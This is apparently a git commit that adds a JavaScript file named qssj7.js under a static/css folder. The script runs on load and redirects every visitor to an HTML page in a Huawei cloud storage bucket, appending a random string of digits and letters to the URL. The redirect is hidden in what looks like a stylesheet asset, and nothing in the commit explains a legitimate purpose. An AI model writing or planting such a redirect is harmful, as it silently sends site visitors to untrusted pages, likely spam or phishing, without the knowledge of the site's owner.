6e83d3d0fc387d864153d7f6e6eb2735bfe96a43
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-25 16:09:37 +0800

    Create qssj7.js

---
+++ static/css/qssj7.js
@@ -0,0 +1,15 @@
+var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/a330a4a31e0a4abaa1daee6f0b40f18a.html#{nnnnnnn}{wwww}',];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
